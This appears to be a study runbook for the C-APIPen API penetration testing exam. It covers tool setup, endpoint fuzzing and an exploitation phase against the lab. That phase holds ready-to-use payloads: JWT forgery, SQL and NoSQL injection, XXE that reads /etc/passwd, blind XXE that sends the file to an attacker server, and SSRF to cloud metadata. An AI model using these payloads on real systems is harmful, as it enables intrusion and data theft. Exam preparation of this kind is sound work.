# 🚀 Detailed Execution Plan (Exam Runbook)

This is the definitive Runbook to execute sequentially and militarily during your **C-APIPen** exam day (4 hours and 15 minutes). Follow these steps strictly to optimize time, avoid "rabbit holes" and secure all 8 flags.

---

## ⏱️ Phase 0: Technical Arsenal Verification (T-Minus 45 to T-Minus 15 Minutes)

Don't let a dependency failure ruin your exam. Run this pre-checklist in your local terminal:

### 1. Binary Execution Tests
Run each command in your terminal to confirm they're installed and responding:
- [x] **ffuf:** `ffuf -V`
- [x] **arjun:** `arjun -h`
- [x] **sqlmap:** `sqlmap --version`
- [x] **jwt_tool:** `python3 -m jwt_tool -h` or `jwt_tool -h`
- [x] **kiterunner:** `kr -h` or `kiterunner -h`

### 2. Confirmation of Local Dictionaries
Make sure your dictionaries exist and aren't corrupted:
- [x] `~/Tools/SecLists/Discovery/Web-Content/api/api-endpoints.txt`
- [x] `~/Tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt`
- [x] `~/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt`

*Quick validation command:*
```bash
head -n 5 ~/Tools/SecLists/Discovery/Web-Content/api/api-endpoints.txt
```

### 3. Burp Suite Redundancy Configuration
- Create a **Project File** (Burp Pro) called `C-APIPen-Exam.burp` to auto-save state to disk.
- Configure **Autorize** (Burp Extension) to intercept requests in the background.
- Configure **JSON Web Tokens** or **JWT Editor** to simplify manual token manipulation.

### 4. Technical Integration Postman ↔️ Burp Suite (The "Postman Test")
To ensure Postman communicates bidirectionally with Burp Suite and avoid SSL errors:
- **Adjust Postman Proxy:**
  1. Open Postman, go to *Settings* (gear icon) -> *Proxy*.
  2. Enable *Add a custom proxy configuration*.
  3. Select both *HTTP* and *HTTPS*.
  4. Set the IP to `127.0.0.1` and port to `8080`.
  5. **Critical!** Disable *Use System Proxy* to prevent infinite traffic loops.
- **Import Burp CA Certificate:**
  1. With your browser listening through Burp's proxy, visit `http://burp` and download `cacert.der`.
  2. In Postman, go to *Settings* -> *Certificates* -> *CA Certificates*.
  3. Upload the `cacert.der` file.
  4. Alternatively, to save time under pressure, you can disable *SSL certificate verification* in the *General* tab of Postman's *Settings*.
- **Run the Interception Test:**
  * Create a simple `GET http://httpbin.org/get` request in Postman and click *Send*.
  * Immediately check in Burp Suite's *HTTP History* tab that the request was registered successfully. If not, restart the proxy in Burp.

## 🚀 Phase 1: Connection and Routing Troubleshooting (T-Minus 15 to T-0)

The environment takes up to 5 minutes to propagate network access once "Start Exam" is pressed.

### Step 1: Establish VPN Connection
Run OpenVPN in your terminal in the background or in a dedicated tab:
```bash
sudo openvpn --config ./certvpn.ovpn --auth-user-pass ./vpn_auth.txt
```
*(Enter your VPN credentials).*

### Step 2: The Network Diagnostic Script
Create and run this quick script in your terminal to monitor connectivity status with the exam internal network:
```bash
while true; do 
  curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 https://$TARGET_HOST && echo " - CONNECTED" || echo " - Waiting for firewall..."
  sleep 5
done
```

### 🚨 Connection Troubleshooting Guide:
*   **Problem:** Ping responds but browser gives timeout (`504` or `ERR_CONNECTION_REFUSED`).
    *   **Cause:** Exam portal firewall hasn't yet mapped your OpenVPN IP.
    *   **Solution:** Disconnect VPN, wait 30 seconds, reconnect and hard refresh your browser (`Cmd + Shift + R`).
*   **Problem:** Loss of external internet connectivity after activating VPN.
    *   **Solution:** Modify your `.ovpn` file by adding the directive `pull-filter ignore "redirect-gateway"` to prevent the VPN from changing your default route to the internet, keeping only the lab network route.

## 🔍 Phase 2: Systematic Discovery and Mapping (0:00 - 0:45)

Don't try to exploit anything in the first 45 minutes. **Your only goal is to build the complete Site Map.**

```
                        [ EXAM START ]
                                |
                   +------------+------------+
                   |                         |
         [ Swagger / OpenAPI ]       [ Active Fuzzing ]
         - /swagger.json             - Kiterunner (endpoints & verbs)
         - /swagger-ui.html          - Arjun (parameters)
         - /api-docs                 - ffuf (routes)
                   |                         |
                   +------------+------------+
                                |
                    [ Populate Burp Site Map ]
                    (Traffic via Postman Proxy)
```

### Step 1: Inspection of Exposed Definitions
Test the following key endpoints immediately in your browser (registered through Burp):
```text
https://$TARGET_HOST/swagger-ui.html
https://$TARGET_HOST/swagger.json
https://$TARGET_HOST/api-docs
https://$TARGET_HOST/v1/api-docs
https://$TARGET_HOST/v2/api-docs
https://$TARGET_HOST/openapi.json
https://$TARGET_HOST/api/v1/swagger.json
```
*If you find a Swagger definition:*
1. Copy it and save it locally as `swagger.json`.
2. Import it into **Postman** (File -> Import -> Link or File). This will instantly create a collection of all possible calls.

### Step 2: Hidden Endpoint Fuzzing (Kiterunner & ffuf)
While analyzing Postman, launch automated tools in parallel to reveal the real architecture.

- **Kiterunner (Contextual Discovery by Verbs):**
  Unlike `ffuf`, Kiterunner understands verb-route pairs. Run this immediately:
  ```bash
  # Quick scan using SecLists-specific API list
  kr scan https://$TARGET_HOST -w ~/Tools/SecLists/Discovery/Web-Content/api/api-endpoints.txt
  
  # If you have a precompiled routes file (.kite), use it for ultra-fast fuzzing:
  kr scan https://$TARGET_HOST -A=apiroutes-240916
  ```

- **ffuf (Classic Route Fuzzing):**
  ```bash
  ffuf -u https://$TARGET_HOST/FUZZ -w ~/Tools/SecLists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,202,301,302,401,403 -c -of json -o /tmp/endpoints.json
  ```

### Step 3: Hidden Parameter Fuzzing (Arjun)
Once you've identified a valid endpoint (e.g. `/api/v1/users`), the documentation might omit hidden administrative or debugging parameters. Don't search blindly, use Arjun to reveal them:

- **Search for Parameters in URL (GET):**
  ```bash
  arjun -u https://$TARGET_HOST/api/v1/users -m GET -w ~/Tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt
  ```

- **Search for Parameters in Body (JSON - POST):**
  ```bash
  arjun -u https://$TARGET_HOST/api/v1/login -m POST --headers "Content-Type: application/json" -w ~/Tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt
  ```

- **Output Interpretation:**
  Arjun will directly tell you if it found any parameter that changes HTTP response length (`length`) or causes different behavior (e.g. `debug`, `admin`, `file`). If it detects one, take it immediately to Burp Suite to test IDOR or Mass Assignment attacks.

### Step 4: Identification of Base Technologies
Observe the responses from your requests (HTTP Headers):
*   `Server: Gunicorn/Uvicorn` -> Indicates Python (FastAPI/Flask). Search for possible Jinja2 template injections (**SSTI**) or localization failures.
*   `X-Powered-By: Express` -> Indicates Node.js. Search for MongoDB NoSQL injections or JS code injections.
*   `Server: Apache-Coyote/1.1` -> Indicates Java (Spring Boot). Search for Thymeleaf/Freemarker SSTI vulnerabilities or Java deserialization.

## 🔐 Phase 3: Targeted Exploitation and Flag Collection (0:45 - 3:30)

This phase is divided into 30-minute blocks per flag. Execute your attacks following the decision tree below.

```
                  [ Does the endpoint receive JSON? ]
                                |
                 +---------------+---------------+
                 | No                            | Yes
         [ Try SQLi / LFI ]              [ Change Content-Type ]
         - Parameters in URL            - Try application/xml (XXE)
         - ?id=1' OR '1'='1             - Inject NoSQL payloads (MongoDB)
                                        - Try field injection (Mass Assign)
```

### Block A: Authentication, JWT and Session (0:45 - 1:45)

#### 1. JWT Abuse (Step by Step)
*   **Step 1:** Intercept the authenticated request. Decode the token in the Burp JWT tab or in `jwt.io`.
*   **Step 2 (alg=none):** Modify the header changing `"alg": "RS256"` or `"HS256"` to `"alg": "none"`.
*   **Step 3:** Modify the payload (e.g. `"is_admin": true`, `"role": "admin"`, `"username": "admin"`).
*   **Step 4:** Remove the signature keeping the dot format (e.g. `header.payload.`). Send.
*   **Step 5 (Key Confusion / RS256 to HS256):** If the API exposes the public key (often in `/jwks.json` or metadata), copy it. Use `jwt_tool` to sign a symmetric token (HS256) using that public key as the secret.

#### 2. Password Reset Evasion
*   **Attempt 1 (Host Header Injection):** Request a password reset for `admin` or another sensitive user. Change the `Host: INSERTEHOST.COM` header to `Host: [YOUR_VPN_IP]:port`. Check your local netcat (`nc -lvnp [port]`) if you receive the reset token.
*   **Attempt 2 (Parameter Pollution / HPP):**
    ```http
    POST /api/v1/password/reset HTTP/1.1
    Content-Type: application/json

    {"email": "admin@target.com", "email": "your-email@evil.com"}
    ```

---

### Block B: Access Control (IDOR / BOLA / BFLA) (1:45 - 2:30)

#### 1. BOLA / IDOR of High Privileges
*   Identify requests to resources via numeric identifiers or UUIDs (e.g. `/api/v1/invoice/download?id=4329`).
*   Configure **Autorize** in Burp Suite:
    1. Copy the authorization token from your **User B (Low privileges)** in Autorize headers.
    2. Navigate the application using your **User A (Administrator or other role)**.
    3. Review the Autorize table. Rows marked in **Green (Bypass!)** confirm that your low-privilege user can download resources from other users.

#### 2. Mass Assignment (Field Modification)
When sending a `PUT` or `PATCH` to edit your current profile:
```json
{
  "name": "Xavier",
  "email": "admin@target.com",
  "is_admin": true,
  "role": "admin",
  "privileges": ["all", "root"]
}
```
*If the response returns the confirmation with these modified fields, you've escalated privileges via Mass Assignment.*

---

### Block C: Data and Service Injection (2:30 - 3:30)

#### 1. SQL Injection Blind in JSON Payloads (sqlmap automated)
If you suspect SQL injection in a JSON endpoint (`POST /api/v1/products/search`), intercept the request in Burp and save it as a text file (`/tmp/request.txt`).

Run `sqlmap` marking the injection point with an asterisk (`*`) in the vulnerable variable within the file or use the `--data` flag:
```bash
sqlmap -r /tmp/request.txt --batch --level=3 --risk=2 --dbs
```
*If it detects the injection:*
```bash
sqlmap -r /tmp/request.txt --batch --dump -T flags_table
```

#### 2. NoSQL Injection (MongoDB)
To bypass authentication or manipulate structured searches in Node.js backends:
```json
{"username": {"$ne": "guest"}, "password": {"$ne": "guest"}}
{"username": "admin", "password": {"$gt": ""}}
```

#### 3. XML External Entity (XXE)
If the server accepts XML, replace the request body with:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userSearch>
  <username>&xxe;</username>
</userSearch>
```
*If the API returns a parse error but doesn't reflect the file, try Blind XXE sending output to your controlled server:*
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[YOUR_VPN_IP]:8000/?x=%file;'>">
%eval;
```

#### 4. Server-Side Request Forgery (SSRF)
If a parameter accepts URLs, try forcing requests to:
*   **AWS Local Service (Metadata):** `http://169.254.169.254/latest/meta-data/`
*   **Alternative Local Services:** `http://127.0.0.1:8080`, `http://localhost:3306`, `http://localhost:27017` (local MongoDB).
*   **Alternate Ports:** Run an internal port scan via SSRF using the Intruder tab in Burp Suite pointing to the port (`http://127.0.0.1:§PORT§`).

## ⏱️ Phase 4: Rabbit Hole Mitigation and Strategic Adjustments (3:30 - 4:00)

If you're stuck and missing flags, execute this mental reset protocol:

1.  **Scope Cleanup:** Filter your HTTP History in Burp to hide requests to static assets (`.js`, `.css`, `.png`). Focus exclusively on API calls of type `application/json` or `application/xml`.
2.  **HTTP Verb Verification:** If a regular query endpoint returns an error, try sending it by modifying the HTTP method (e.g. from `GET` to `POST` or `PUT`).
3.  **Method Override Headers:** Try bypassing access controls using alternative headers:
    *   `X-HTTP-Method-Override: PUT`
    *   `X-Original-URL: /api/v1/admin`
    *   `X-Rewrite-URL: /api/v1/admin`
